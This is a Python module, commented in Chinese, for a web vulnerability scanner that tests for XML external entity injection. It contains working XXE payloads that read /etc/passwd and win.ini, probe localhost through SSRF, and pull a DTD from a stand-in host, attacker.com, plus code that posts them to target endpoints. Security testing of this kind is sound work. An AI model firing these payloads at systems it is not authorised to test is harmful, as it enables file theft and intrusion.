"""
XXE（XML外部实体注入）检测模块
检测应用是否存在XXE漏洞
"""

import asyncio
import aiohttp
from typing import List, Dict, Optional
from dataclasses import dataclass
from urllib.parse import urlparse

from core.base import BaseModule, ScanResult, Severity, ResultType
from core.logger import Logger


@dataclass
class XXEPoint:
    """XXE漏洞点"""
    endpoint: str
    method: str
    content_type: str
    payload: str
    evidence: str


# XXE测试Payload
XXE_PAYLOADS = [
    # 基础XXE - 读取文件
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''', "file_read"),
    
    # Windows文件
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>''', "file_read_windows"),
    
    # SSRF通过XXE
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80">
]>
<root>&xxe;</root>''', "ssrf"),
    
    # 参数实体
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<root>test</root>''', "parameter_entity"),
    
    # Blind XXE - 外部DTD
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/blind.dtd">
  %xxe;
]>
<root>test</root>''', "blind"),
    
    # CDATA包装
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[&xxe;]]></root>''', "cdata"),
]

# XXE响应特征
XXE_INDICATORS = [
    "root:x:0:0",
    "[fonts]",
    "[extensions]",
    "daemon:",
    "nobody:",
    "/bin/bash",
    "/bin/sh",
]


class XXEScanner(BaseModule):
    """
    XXE漏洞扫描器
    检测XML外部实体注入漏洞
    """
    
    name = "xxe_scanner"
    description = "XXE XML外部实体注入漏洞检测器"
    author = "PySecScanner"
    version = "1.0.0"
    
    def __init__(self, config=None, logger=None):
        super().__init__(config, logger)
        self.timeout = 15
        self.concurrency = 3
        self.payloads = XXE_PAYLOADS
        self.xxe_points: List[XXEPoint] = []
        self.base_url = ""
    
    async def scan(self, target: str) -> List[ScanResult]:
        """
        执行XXE扫描
        
        Args:
            target: 目标URL
        """
        self.base_url = self._normalize_url(target)
        if not self.base_url:
            self.logger.error(f"无效的URL: {target}")
            return []
        
        self.logger.info(f"目标URL: {self.base_url}")
        
        # 发现可能的XML端点
        endpoints = await self._discover_xml_endpoints()
        
        if not endpoints:
            self.logger.warning("未发现XML端点，尝试直接测试目标URL")
            endpoints = [self.base_url]
        
        # 测试XXE
        self.xxe_points = await self._test_xxe(endpoints)
        
        # 生成结果
        results = []
        for xxe in self.xxe_points:
            result = ScanResult(
                result_type=ResultType.VULNERABILITY,
                title=f"XXE漏洞: {xxe.endpoint}",
                description=f"端点 {xxe.endpoint} 存在XXE漏洞",
                severity=Severity.HIGH,
                target=xxe.endpoint,
                evidence=f"方法: {xxe.method}\nContent-Type: {xxe.content_type}\nPayload:\n{xxe.payload[:200]}...\n证据: {xxe.evidence}",
                raw_data=xxe.__dict__
            )
            results.append(result)
            self.add_result(result)
        
        if self.xxe_points:
            self.logger.print_result(
                "发现的XXE漏洞",
                [f"{x.endpoint}" for x in self.xxe_points]
            )
        else:
            self.logger.info("未发现XXE漏洞")
        
        return results
    
    def _normalize_url(self, url: str) -> str:
        """规范化URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url
    
    async def _discover_xml_endpoints(self) -> List[str]:
        """发现可能的XML端点"""
        endpoints = []
        
        # 常见XML端点
        common_paths = [
            "/api/xml",
            "/api/soap",
            "/soap",
            "/ws",
            "/wsdl",
            "/xmlrpc.php",
            "/api",
        ]
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for path in common_paths:
                url = self.base_url.rstrip('/') + path
                try:
                    async with session.get(url) as response:
                        content_type = response.headers.get('Content-Type', '')
                        if 'xml' in content_type.lower():
                            endpoints.append(url)
                except:
                    pass
        
        return endpoints
    
    async def _test_xxe(self, endpoints: List[str]) -> List[XXEPoint]:
        """测试XXE漏洞"""
        semaphore = asyncio.Semaphore(self.concurrency)
        xxe_points: List[XXEPoint] = []
        
        connector = aiohttp.TCPConnector(ssl=False, limit=self.concurrency)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async def test_endpoint(endpoint: str) -> Optional[XXEPoint]:
            async with semaphore:
                for payload, payload_type in self.payloads:
                    try:
                        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                            headers = {'Content-Type': 'application/xml'}
                            
                            async with session.post(endpoint, data=payload, headers=headers) as response:
                                content = await response.text()
                                
                                # 检查XXE特征
                                for indicator in XXE_INDICATORS:
                                    if indicator in content:
                                        return XXEPoint(
                                            endpoint=endpoint,
                                            method="POST",
                                            content_type="application/xml",
                                            payload=payload,
                                            evidence=f"发现敏感内容: {indicator}"
                                        )
                                        
                    except Exception:
                        pass
                
                return None
        
        tasks = [test_endpoint(endpoint) for endpoint in endpoints]
        
        completed = 0
        total = len(tasks)
        
        for coro in asyncio.as_completed(tasks):
            result = await coro
            completed += 1
            self.logger.print_progress(completed, total, "XXE测试中")
            
            if result:
                xxe_points.append(result)
        
        print()
        
        return xxe_points
